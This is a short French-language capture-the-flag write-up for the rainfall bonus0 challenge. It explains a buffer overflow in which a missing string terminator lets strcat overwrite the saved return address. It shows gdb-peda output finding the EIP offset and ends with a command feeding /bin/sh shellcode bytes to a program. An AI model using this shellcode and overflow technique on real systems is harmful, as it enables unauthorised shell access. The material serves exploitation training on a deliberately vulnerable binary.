- en lisant le code et en l'executant on comprend qu'il y a un bug/faille
- dans la fonction pp le \0 de la 1er string est remplacer par un espace
- se qui fait quequand la premiere string est entierement remplis il considere str1 et str2 comme une string
- str2 est donc copier a la fin de str1 + str2 dans strcat
- Dans gdb on voit donc qu'on peut ecrire sur la variable $eip
<pre>
gdb-peda$ pattern create 30
'AAA%AAsAABAA$AAnAACAA-AA(AADAA'
gdb-peda$ r
Starting program: /home/alarm/rainfall/bonus0/Ressources/bonus0 
 - 
iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii
 - 
AAA%AAsAABAA$AAnAACAA-AA(AADAA
iiiiiiiiiiiiiiiiiiiiAAA%AAsAABAA$AAnAACA AAA%AAsAABAA$AAnAACA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
<strong>EIP: 0x416e4141 ('AAnA')</strong>
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x416e4141
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x416e4141 in ?? ()
gdb-peda$ pattern offset AAnA
<strong>AAnA found at offset: 13</strong>
</pre>

```
(python -c "print('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd')" && ./a.out && cat)
```
